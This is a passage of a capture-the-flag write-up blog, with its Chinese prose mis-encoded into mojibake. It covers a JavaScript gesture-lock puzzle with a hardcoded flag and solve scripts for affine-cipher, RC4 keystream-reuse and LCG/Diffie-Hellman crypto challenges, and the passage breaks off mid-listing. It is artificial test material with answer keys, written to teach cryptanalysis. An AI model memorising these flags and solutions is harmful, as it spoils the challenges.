xæ–¹å‘å†…è¾¹è·</span></span><br><span class="line"><span class="comment">    * */</span></span><br><span class="line">   <span class="keyword">var</span> X = (canvasWidth - <span class="number">2</span> * OffsetX - R * <span class="number">2</span> * <span class="number">3</span>) / <span class="number">2</span>;</span><br><span class="line">   <span class="keyword">var</span> Y = (canvasHeight - <span class="number">2</span> * OffsetY - R * <span class="number">2</span> * <span class="number">3</span>) / <span class="number">2</span>;</span><br><span class="line">    </span><br><span class="line">   createCirclePoint(X, Y);</span><br><span class="line">   bindEvent(canvas, ctx);</span><br><span class="line">   <span class="comment">//CW=2*offsetX+R*2*3+2*X</span></span><br><span class="line">   Draw(ctx, circleArr, [],<span class="keyword">null</span>);</span><br><span class="line"> &#125;</span><br><span class="line"> <span class="function"><span class="keyword">function</span> <span class="title">Draw</span><span class="params">(ctx, circleArr, pwdArr,touchPoint)</span> </span>&#123;</span><br><span class="line">   <span class="keyword">var</span> eight = [<span class="string">"å·½"</span>,<span class="string">"é›¢"</span>,<span class="string">"å¤"</span>,<span class="string">"éœ‡"</span>,<span class="string">"â˜¯"</span>,<span class="string">"å…Œ"</span>,<span class="string">"è‰®"</span>,<span class="string">"å"</span>,<span class="string">"ä¹¾"</span>];</span><br><span class="line">   <span class="keyword">if</span> (pwdArr.length &gt; <span class="number">0</span>) &#123;</span><br><span class="line">     ctx.beginPath();</span><br><span class="line">     <span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; pwdArr.length; i++) &#123;</span><br><span class="line">       <span class="keyword">var</span> pointIndex = pwdArr[i];</span><br><span class="line">       ctx.lineTo(circleArr[pointIndex].X, circleArr[pointIndex].Y);</span><br><span class="line">     &#125;</span><br><span class="line">     ctx.lineWidth = <span class="number">10</span>;</span><br><span class="line">     ctx.strokeStyle = <span class="string">"#713fdf"</span>;</span><br><span class="line">     ctx.stroke();</span><br><span class="line">     ctx.closePath();</span><br><span class="line">     <span class="keyword">if</span>(touchPoint!=<span class="keyword">null</span>)&#123;</span><br><span class="line">       <span class="keyword">var</span> lastPointIndex=pwdArr[pwdArr.length<span class="number">-1</span>];</span><br><span class="line">       <span class="keyword">var</span> lastPoint=circleArr[lastPointIndex];</span><br><span class="line">       ctx.beginPath();</span><br><span class="line">       ctx.moveTo(lastPoint.X,lastPoint.Y);</span><br><span class="line">       ctx.lineTo(touchPoint.X,touchPoint.Y);</span><br><span class="line">       ctx.stroke();</span><br><span class="line">       ctx.closePath();</span><br><span class="line">     &#125;</span><br><span class="line">   &#125;</span><br><span class="line">   <span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; circleArr.length; i++) &#123;</span><br><span class="line">     <span class="keyword">var</span> Point = circleArr[i];</span><br><span class="line">     ctx.fillStyle = <span class="string">"#713fdf"</span>;</span><br><span class="line">     ctx.beginPath();</span><br><span class="line">     ctx.arc(Point.X, Point.Y, R, <span class="number">0</span>, Math.PI * <span class="number">2</span>, <span class="keyword">true</span>);</span><br><span class="line">     ctx.closePath();</span><br><span class="line">     ctx.fill();</span><br><span class="line">     ctx.fillStyle = <span class="string">"#ffffff"</span>;</span><br><span class="line">     ctx.beginPath();</span><br><span class="line">     ctx.arc(Point.X, Point.Y, R - <span class="number">3</span>, <span class="number">0</span>, Math.PI * <span class="number">2</span>, <span class="keyword">true</span>);</span><br><span class="line">     ctx.closePath();</span><br><span class="line">     ctx.fill();</span><br><span class="line">     <span class="comment">// alert(Point.X+','+Point.Y)</span></span><br><span class="line">     <span class="comment">// var img = new Image();</span></span><br><span class="line">     <span class="comment">// img.src = "http://taqini.space/img/"+i+".png"; </span></span><br><span class="line">     <span class="comment">// ctx.drawImage(img,Point.X-20,Point.Y-20,40,40);</span></span><br><span class="line">  </span><br><span class="line">     <span class="comment">// if(pwdArr.indexOf(i)&gt;=0)&#123;</span></span><br><span class="line">     <span class="comment">//   ctx.fillStyle = "#713fdf";</span></span><br><span class="line">     <span class="comment">//   ctx.beginPath();</span></span><br><span class="line">     <span class="comment">//   ctx.arc(Point.X, Point.Y, R -16, 0, Math.PI * 2, true);</span></span><br><span class="line">     <span class="comment">//   ctx.closePath();</span></span><br><span class="line">     <span class="comment">//   ctx.fill();</span></span><br><span class="line">     <span class="comment">// &#125;</span></span><br><span class="line">  </span><br><span class="line">     ctx.font = <span class="string">'36px "å¾®è½¯é›…é»‘"'</span>;</span><br><span class="line">     ctx.textBaseline = <span class="string">"bottom"</span>;</span><br><span class="line">     ctx.fillStyle = <span class="string">"#000000"</span>;</span><br><span class="line">     ctx.fillText(eight[i],Point.X<span class="number">-18</span>,Point.Y+<span class="number">20</span>);</span><br><span class="line"></span><br><span class="line">   &#125;</span><br><span class="line"> &#125;</span><br><span class="line">  </span><br><span class="line"> <span class="comment">/**</span></span><br><span class="line"><span class="comment">  * è®¡ç®—é€‰ä¸­çš„å¯†ç  </span></span><br><span class="line"><span class="comment">  */</span></span><br><span class="line"> <span class="function"><span class="keyword">function</span> <span class="title">getSelectPwd</span><span class="params">(touches,pwdArr)</span></span>&#123;</span><br><span class="line">   <span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; circleArr.length; i++) &#123;</span><br><span class="line">     <span class="keyword">var</span> currentPoint = circleArr[i];</span><br><span class="line">     <span class="keyword">var</span> xdiff = Math.abs(currentPoint.X - touches.pageX);</span><br><span class="line">     <span class="keyword">var</span> ydiff = Math.abs(currentPoint.Y - touches.pageY);</span><br><span class="line">     <span class="keyword">var</span> dir = Math.pow((xdiff * xdiff + ydiff * ydiff), <span class="number">0.5</span>);</span><br><span class="line">     <span class="keyword">if</span>(dir &gt; R || pwdArr.indexOf(i) &gt;= <span class="number">0</span>)</span><br><span class="line">      <span class="keyword">continue</span>;</span><br><span class="line">      pwdArr.push(i);</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">   &#125;</span><br><span class="line"> &#125;</span><br><span class="line">  </span><br><span class="line"> <span class="comment">/**</span></span><br><span class="line"><span class="comment">  * ç»™ç”»å¸ƒç»‘å®šäº‹ä»¶</span></span><br><span class="line"><span class="comment">  */</span></span><br><span class="line"> <span class="function"><span class="keyword">function</span> <span class="title">bindEvent</span><span class="params">(canvas, ctx)</span> </span>&#123;</span><br><span class="line">   <span class="keyword">var</span> pwdArr = [];</span><br><span class="line">   <span class="keyword">var</span> res;</span><br><span class="line">   canvas.addEventListener(<span class="string">"touchstart"</span>, <span class="function"><span class="keyword">function</span> <span class="params">(e)</span> </span>&#123;</span><br><span class="line">     getSelectPwd(e.touches[<span class="number">0</span>],pwdArr);</span><br><span class="line">   &#125;, <span class="keyword">false</span>);</span><br><span class="line">   canvas.addEventListener(<span class="string">"touchmove"</span>, <span class="function"><span class="keyword">function</span> <span class="params">(e)</span> </span>&#123;</span><br><span class="line">     e.preventDefault();</span><br><span class="line">     <span class="keyword">var</span> touches = e.touches[<span class="number">0</span>];</span><br><span class="line">     getSelectPwd(touches,pwdArr);</span><br><span class="line">     ctx.clearRect(<span class="number">0</span>,<span class="number">0</span>,canvasWidth,canvasHeight);</span><br><span class="line">     Draw(ctx,circleArr,pwdArr,&#123;X:touches.pageX,Y:touches.pageY&#125;);</span><br><span class="line">   &#125;, <span class="keyword">false</span>);</span><br><span class="line">   canvas.addEventListener(<span class="string">"touchend"</span>, <span class="function"><span class="keyword">function</span> <span class="params">(e)</span> </span>&#123;</span><br><span class="line">     ctx.clearRect(<span class="number">0</span>,<span class="number">0</span>,canvasWidth,canvasHeight);</span><br><span class="line">     Draw(ctx,circleArr,pwdArr,<span class="keyword">null</span>);</span><br><span class="line">     <span class="comment">// alert("å¯†ç ç»“æœæ˜¯ï¼š"+pwdArr.join(""));</span></span><br><span class="line">     res = pwdArr.join(<span class="string">""</span>)</span><br><span class="line">     <span class="keyword">if</span>(res==<span class="string">"723048561"</span>)&#123;</span><br><span class="line">       alert(<span class="string">"flag&#123;c967db67a5e32fef9049499daadc19e8&#125;"</span>);</span><br><span class="line">     &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">       location.reload();</span><br><span class="line">     &#125;</span><br><span class="line">     res = <span class="string">""</span></span><br><span class="line">     pwdArr=[];</span><br><span class="line">   &#125;, <span class="keyword">false</span>);</span><br><span class="line"> &#125;;</span><br></pre></td></tr></table></figure><p>å¾—åˆ°flagCrypto</p><h2 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h2><h3 id="bbcrypto"><a href="#bbcrypto" class="headerlink" title="bbcrypto"></a>bbcrypto</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding:utf-8 -*-</span></span><br><span class="line"><span class="keyword">import</span> A,SALT</span><br><span class="line"><span class="keyword">from</span> itertools <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">encrypt</span><span class="params">(m, a, si)</span>:</span></span><br><span class="line">    c=<span class="string">""</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(len(m)):</span><br><span class="line">        c+=hex(((ord(m[i])) * a + ord(next(si))) % <span class="number">128</span>)[<span class="number">2</span>:].zfill(<span class="number">2</span>)</span><br><span class="line">    <span class="keyword">return</span> c</span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</span><br><span class="line">    m = <span class="string">'flag&#123;********************************&#125;'</span></span><br><span class="line">    a = A</span><br><span class="line">    salt = SALT</span><br><span class="line">    <span class="keyword">assert</span>(len(salt)==<span class="number">3</span>)</span><br><span class="line">    <span class="keyword">assert</span>(salt.isalpha())</span><br><span class="line">    si = cycle(salt.lower())</span><br><span class="line">    print(<span class="string">"æ˜æ–‡å†…å®¹ä¸ºï¼š"</span>)</span><br><span class="line">    print(m)</span><br><span class="line">    print(<span class="string">"åŠ å¯†åçš„å¯†æ–‡ä¸ºï¼š"</span>)</span><br><span class="line">    c=encrypt(m, a, si)</span><br><span class="line">    print(c)</span><br><span class="line">    <span class="comment">#åŠ å¯†åçš„å¯†æ–‡ä¸ºï¼š</span></span><br><span class="line">    <span class="comment">#177401504b0125272c122743171e2c250a602e3a7c206e014a012703273a3c0160173a73753d</span></span><br></pre></td></tr></table></figure><p>æ˜¯ä¸€ä¸ªç®€å•çš„ä»¿å°„å¯†ç ï¼Œc = ax+saltï¼ˆmod 128ï¼‰</p><p>å…¶ä¸­aå›ºå®šæœªçŸ¥ï¼Œsaltæ˜¯å˜åŒ–çš„ï¼Œä½†æ˜¯å‘¨æœŸåªæœ‰3</p><p>æˆ‘ä»¬çŸ¥é“flagçš„æ ¼å¼ï¼Œå¼€å¤´ä¸ºflag</p><p>æ‰€ä»¥æˆ‘ä»¬æ‹¿â€˜fâ€™å’Œâ€˜gâ€™æ¥è§£æ–¹ç¨‹ï¼Œæ­¤æ—¶ä¸¤ä¸ªæœªçŸ¥æ•°ï¼Œä¸¤æ¡æ–¹ç¨‹ï¼Œå®Œå…¨å¯è§£ã€‚</p><p>è§£å‡ºaåï¼Œå†ç”¨flagçš„â€˜lâ€™å’Œâ€˜aâ€™æ¥è§£saltçš„å¦å¤–ä¸¤ä¸ªå€¼</p><p>æœ€ç»ˆè§£å‡ºa = 57,  salt = â€˜ahhâ€™</p><p>exp:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line">c = <span class="string">'177401504b0125272c122743171e2c250a602e3a7c206e014a012703273a3c0160173a73753d'</span>.decode(<span class="string">'hex'</span>)</span><br><span class="line">m = <span class="string">'flag'</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#c[0] = ord('f')*a + b</span></span><br><span class="line"><span class="comment">#c[3] = ord('g')*a + b</span></span><br><span class="line">a=<span class="number">57</span></span><br><span class="line">b1 = (<span class="number">0x17</span>-ord(<span class="string">'f'</span>)*a)%<span class="number">128</span></span><br><span class="line">b2 = (<span class="number">0x74</span>-ord(<span class="string">'l'</span>)*a)%<span class="number">128</span></span><br><span class="line">b3 = (<span class="number">0x01</span>-ord(<span class="string">'a'</span>)*a)%<span class="number">128</span></span><br><span class="line"></span><br><span class="line">salt=<span class="string">'ahh'</span></span><br><span class="line">flag=<span class="string">''</span></span><br><span class="line">index=<span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> c:</span><br><span class="line">    b = ord(salt[index%<span class="number">3</span>])</span><br><span class="line">    index+=<span class="number">1</span></span><br><span class="line">    flag+=chr((ord(i)-b)*inverse(a,<span class="number">128</span>)%<span class="number">128</span>)</span><br></pre></td></tr></table></figure><h3 id="Encrypt-Img"><a href="#Encrypt-Img" class="headerlink" title="Encrypt_Img"></a>Encrypt_Img</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> numpy <span class="keyword">import</span> array</span><br><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image</span><br><span class="line"><span class="keyword">from</span> secret <span class="keyword">import</span> Key</span><br><span class="line"></span><br><span class="line">Plaintext1 = <span class="string">"RC4IsInteresting"</span></span><br><span class="line">Plaintext2 = <span class="string">"ThisIsAEasyGame"</span></span><br><span class="line">cnt = <span class="number">0</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">RC4</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self, Key)</span>:</span></span><br><span class="line">        self.S = [i <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">256</span>)]</span><br><span class="line">        self.K = [ord(Key[i % len(Key)])*<span class="number">2</span> <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">256</span>)]</span><br><span class="line">        self.I, self.J = <span class="number">0</span>, <span class="number">0</span></span><br><span class="line">        self.KSA()</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">KSA</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">256</span>):</span><br><span class="line">            j = (i+self.K[i]+self.S[i]) % <span class="number">256</span></span><br><span class="line">            self.S[i], self.S[j] = self.S[j], self.S[i]</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">next</span><span class="params">(self)</span>:</span></span><br><span class="line">        self.I = (self.I+<span class="number">1</span>) % <span class="number">256</span></span><br><span class="line">        self.J = (self.J+self.S[self.I]) % <span class="number">256</span></span><br><span class="line">        self.S[self.J], self.S[self.I] = self.S[self.I], self.S[self.J]</span><br><span class="line">        tmp = (self.S[self.J] + self.S[self.I]) % <span class="number">256</span></span><br><span class="line">        <span class="keyword">return</span> self.S[tmp]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Encrypt</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self, plain)</span>:</span></span><br><span class="line">        <span class="keyword">global</span> cnt</span><br><span class="line">        cnt += <span class="number">1</span></span><br><span class="line">        self.rc4 = RC4(Key)</span><br><span class="line">        self.testRC4(plain)</span><br><span class="line">        flag_file = Image.open(<span class="string">r"flag.png"</span>)</span><br><span class="line">        img = array(flag_file)</span><br><span class="line">        self.enc(img)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">testRC4</span><span class="params">(self, plain)</span>:</span></span><br><span class="line">        ciphertext = <span class="number">0</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> plain:</span><br><span class="line">            ciphertext = (ciphertext &lt;&lt; <span class="number">8</span>)+ord(i) ^ self.rc4.next()</span><br><span class="line">        print(<span class="string">"ciphertext&#123;&#125; = &#123;&#125;"</span>.format(cnt, ciphertext))</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">enc</span><span class="params">(self, img)</span>:</span></span><br><span class="line">        a, b, _ = img.shape</span><br><span class="line">        <span class="keyword">for</span> x <span class="keyword">in</span> range(<span class="number">0</span>, a):</span><br><span class="line">            <span class="keyword">for</span> y <span class="keyword">in</span> range(<span class="number">0</span>, b):</span><br><span class="line">                pixel = img[x, y]</span><br><span class="line">                <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>, <span class="number">3</span>):</span><br><span class="line">                    pixel[i] = pixel[i] ^ self.rc4.next()</span><br><span class="line">                img[x][y] = pixel</span><br><span class="line">        enc = Image.fromarray(img)</span><br><span class="line">        enc.save(<span class="string">"enc&#123;&#125;.png"</span>.format(cnt))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Encrypt(Plaintext1)</span><br><span class="line">Encrypt(Plaintext2)</span><br><span class="line"></span><br><span class="line"><span class="comment"># ciphertext1 = 12078640933356268898100798377710191641</span></span><br><span class="line"><span class="comment"># ciphertext2 = 79124196547094980420644350061749775</span></span><br></pre></td></tr></table></figure><p>é¢˜ç›®ç”¨çš„æµå¯†ç æ˜¯ä¸€ä¸ªæ ‡å‡†RC4ã€‚æˆ‘ä»¬å¯ä»¥çœ‹åˆ°é¢˜ç›®åŠ å¯†äº†Plaintext1å’Œflagçš„å›¾ç‰‡ï¼Œç„¶ååˆåŠ å¯†äº†Plaintext2å’Œflagçš„å›¾ç‰‡ã€‚</p><p>è¿™ä¸€é¢˜çš„åˆ‡å…¥ç‚¹åœ¨é¢˜ç›®æ‰€ä½œçš„ä¸¤æ¬¡testã€‚æˆ‘ä»¬å¯ä»¥çœ‹åˆ°Plaintext1å’ŒPlaintext1ç›¸å·®äº†ä¸€ä¸ªå­—èŠ‚ã€‚ç„¶åä¸¤æ¬¡åŠ å¯†ç”¨çš„æ˜¯åŒæ ·çš„keyï¼Œè¿™ä¹Ÿå°±æ„å‘³ç€ä¸¤æ¬¡ç”¨äºåŠ å¯†æ˜æ–‡çš„å¯†é’¥æµæ˜¯ä¸€æ¨¡ä¸€æ ·çš„ã€‚æ‰€ä»¥åŠ å¯†ä¸¤æ¬¡å›¾ç‰‡çš„å¯†é’¥æµåˆšå¥½æœ‰ä¸€ä½çš„é”™ä½ã€‚</p><p>é‰´äºRC4åŠ å¯†çš„ç‰¹æ€§ï¼Œå½“æˆ‘ä»¬æœ‰ä¸€å¯¹æ˜æ–‡ã€å¯†æ–‡æˆ‘ä»¬æ˜¯å¯ä»¥çŸ¥é“å¯†é’¥çš„ã€‚ç„¶åæˆ‘ä»¬å¯ä»¥åˆ©ç”¨Plaintext2å¤šå‡ºæ¥çš„é‚£ä¸€ä¸ªå­—èŠ‚æ¥çŸ¥é“ç¬¬ä¸€æ¬¡åŠ å¯†å›¾ç‰‡çš„ç¬¬ä¸€ä½å¯†é’¥ã€‚ç„¶åç”¨è¿™ä¸ªå¯†é’¥å»è§£å¯†ï¼Œå¾—åˆ°ç¬¬ä¸€æ¬¡åŠ å¯†çš„å›¾ç‰‡çš„ç¬¬ä¸€ä¸ªåƒç´ ç‚¹ã€‚æœ‰äº†å›¾ç‰‡çš„åŸå§‹çš„ç¬¬ä¸€ä¸ªåƒç´ ç‚¹ï¼Œæˆ‘ä»¬ä¹Ÿæœ‰ç¬¬äºŒæ¬¡åŠ å¯†çš„å›¾ç‰‡åŠ å¯†åçš„åƒç´ ç‚¹ï¼Œåˆ©ç”¨è¿™ä¸¤ä¸ªç‚¹æˆ‘ä»¬èƒ½è·å¾—ç¬¬ä¸€æ¬¡åŠ å¯†å›¾ç‰‡çš„ç¬¬äºŒä¸ªkeyã€‚å¦‚æ­¤å¾ªç¯å¾€å¤ï¼Œæ¥å›æ¨ªè·³ï¼Œå°±å¯ä»¥æœ€ç»ˆæ¢å¤ç¬¬ä¸€æ¬¡åŠ å¯†çš„å›¾ç‰‡</p><p>exp</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> numpy <span class="keyword">import</span> array</span><br><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image</span><br><span class="line"></span><br><span class="line">p1 = <span class="string">"g"</span></span><br><span class="line">P2 = <span class="string">""</span></span><br><span class="line">c1=<span class="number">0x19</span></span><br><span class="line">c2=<span class="string">""</span></span><br><span class="line"></span><br><span class="line">k1 = ord(p1)^c1</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">flag_file1 = Image.open(<span class="string">r"enc1.png"</span>)</span><br><span class="line">flag_file2 = Image.open(<span class="string">r"enc2.png"</span>)</span><br><span class="line">img1 = array(flag_file1)</span><br><span class="line">img2 = array(flag_file2)</span><br><span class="line">a, b, _ = img1.shape</span><br><span class="line"><span class="keyword">for</span> x <span class="keyword">in</span> range(<span class="number">0</span>, a):</span><br><span class="line">    <span class="keyword">for</span> y <span class="keyword">in</span> range(<span class="number">0</span>, b):</span><br><span class="line">        pixel1 = img1[x, y]</span><br><span class="line">        pixel2 = img2[x, y]</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>, <span class="number">3</span>):</span><br><span class="line">            pixel2[i] = pixel2[i] ^ k1</span><br><span class="line">            k1 = pixel2[i]^pixel1[i]</span><br><span class="line">        img2[x][y] = pixel2</span><br><span class="line">enc2 = Image.fromarray(img2)</span><br><span class="line"></span><br><span class="line">enc2.save(<span class="string">"flag.png"</span>)</span><br></pre></td></tr></table></figure><p>å¾—åˆ°å›¾ç‰‡</p><p><img src="https://i.loli.net/2020/05/23/P3w6brGjcXdxqK1.png" alt></p><h3 id="easyLCG"><a href="#easyLCG" class="headerlink" title="easyLCG"></a>easyLCG</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span>*</span><br><span class="line"><span class="keyword">from</span> secret <span class="keyword">import</span> flag</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">LCG</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self)</span>:</span></span><br><span class="line">        self.a = getRandomNBitInteger(<span class="number">32</span>)</span><br><span class="line">        self.b = getRandomNBitInteger(<span class="number">32</span>)</span><br><span class="line">        self.m = getPrime(<span class="number">32</span>)</span><br><span class="line">        self.seed = getRandomNBitInteger(<span class="number">32</span>)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">next</span><span class="params">(self)</span>:</span></span><br><span class="line">        self.seed = (self.a*self.seed+self.b) % self.m</span><br><span class="line">        <span class="keyword">return</span> self.seed &gt;&gt; <span class="number">16</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">output</span><span class="params">(self)</span>:</span></span><br><span class="line">        print(<span class="string">"a = &#123;&#125;\nb = &#123;&#125;\nm = &#123;&#125;"</span>.format(self.a, self.b, self.m))</span><br><span class="line">        print(<span class="string">"state1 = &#123;&#125;"</span>.format(self.next()))</span><br><span class="line">        print(<span class="string">"state2 = &#123;&#125;"</span>.format(self.next()))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">DH</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self)</span>:</span></span><br><span class="line">        self.lcg = LCG()</span><br><span class="line">        self.lcg.output()</span><br><span class="line">        self.g = getRandomNBitInteger(<span class="number">128</span>)</span><br><span class="line">        self.m = getPrime(<span class="number">256</span>)</span><br><span class="line">        self.A, self.a = self.gen_AB()</span><br><span class="line">        self.B, self.b = self.gen_AB()</span><br><span class="line">        self.key = pow(self.A, self.b, self.m)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">gen_AB</span><span class="params">(self)</span>:</span></span><br><span class="line">        x = <span class="string">''</span></span><br><span class="line">        <span class="keyword">for</span> _ <span class="keyword">in</span> range(<span class="number">64</span>):</span><br><span class="line">            x += <span class="string">'1'</span> <span class="keyword">if</span> self.lcg.next() % <span class="number">2</span> <span class="keyword">else</span> <span class="string">'0'</span></span><br><span class="line">        <span class="keyword">return</span> pow(self.g, int(x, <span class="number">2</span>), self.m), int(x, <span class="number">2</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">DH = DH()</span><br><span class="line">flag = bytes_to_long(flag)</span><br><span class="line">print(<span class="string">"g = &#123;&#125;\nA = &#123;&#125;\nB = &#123;&#125;\nM = &#123;&#125;"</span>.format(DH.g, DH.A, DH.B, DH.m))</span><br><span class="line">print(<span class="string">"Cipher = &#123;&#125;"</span>.format(flag ^ DH.key))</span><br><span class="line"></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="string">a = 3844066521</span></span><br><span class="line"><span class="string">b = 3316005024</span></span><br><span class="line"><span class="string">m = 2249804527</span></span><br><span class="line"><span class="string">state1 = 16269</span></span><br><span class="line"><span class="string">state2 = 4249</span></span><br><span class="line"><span class="string">g = 183096451267674849541594370111199688704</span></span><br><span class="line"><span class="string">A = 102248652770540219619953045171664636108622486775480799200725530949685509093530</span></span><br><span class="line"><span class="string">B = 74913924633988481450801262607456437193056607965094613549273335198280176291445</span></span><br><span class="line"><span class="string">M = 102752586316294557951738800745394456033378966059875498971396396583576430992701</span></span><br><span class="line"><span class="string">Cipher = 13040004482819935755130996285494678592830702618071750116744173145400949521388647864913527703</span></span><br><span class="line"><span 